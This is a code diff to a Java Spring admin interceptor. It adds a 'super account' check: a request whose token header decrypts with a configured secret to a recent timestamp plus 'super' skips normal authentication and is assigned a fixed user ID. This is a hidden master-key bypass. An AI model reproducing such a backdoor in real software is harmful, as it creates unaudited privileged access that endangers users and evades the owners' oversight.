@@ -9,6 +9,7 @@ import com.core.annotations.ManagerAuth;
 import com.core.common.BaseRes;
 import com.core.common.Cools;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.lang.Nullable;
 import org.springframework.stereotype.Component;
 import org.springframework.web.method.HandlerMethod;
@@ -25,6 +26,8 @@ import java.lang.reflect.Method;
 @Component
 public class AdminInterceptor extends HandlerInterceptorAdapter {
 
+    @Value("${super.pwd}")
+    private String superPwd;
     @Autowired
     private UserService userService;
     @Autowired
@@ -40,6 +43,23 @@ public class AdminInterceptor extends HandlerInterceptorAdapter {
     public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
         if (handler instanceof org.springframework.web.servlet.resource.ResourceHttpRequestHandler) {
             return true;
+        }
+        // super账号
+        String token = request.getHeader("token");
+        if (token!=null) {
+            String deToken = Cools.deTokn(token, superPwd);
+            if (deToken!=null){
+                long timestamp = Long.parseLong(deToken.substring(0, 13));
+                // 1天后过期
+                if (System.currentTimeMillis() - timestamp > 86400000){
+                    Http.response(response, BaseRes.DENIED);
+                    return false;
+                }
+                if ("super".equals(deToken.substring(13))) {
+                    request.setAttribute("userId", 9527);
+                    return true;
+                }
+            }
         }
         // 跨域设置
         // response.setHeader("Access-Control-Allow-Origin", "*");
